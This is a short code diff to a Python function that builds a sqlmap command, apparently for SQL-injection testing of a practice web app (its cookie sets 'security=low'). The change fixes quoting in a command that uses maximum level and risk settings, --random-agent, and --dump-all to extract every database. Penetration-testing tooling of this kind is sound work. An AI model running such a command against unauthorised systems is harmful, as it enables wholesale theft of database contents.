@@ -47,8 +47,8 @@ def run_sqlmap(target_url, session_id):
     if session_id:
         # More aggressive SQLMap options for full-fledged SQL injection testing
         sqlmap_command = (
-            f"sqlmap -u {target_url} "
-            f"--cookie='PHPSESSID={session_id}; security=low' "
+            f"sqlmap -u \"{target_url}\" "
+            f"--cookie=\"PHPSESSID={session_id}\\; security=low\" "
             "--batch --level=5 --risk=3 --dbs --tables --columns --dump-all --random-agent --threads=5"
         )
         print(f"Running SQLMap with command: {sqlmap_command}")
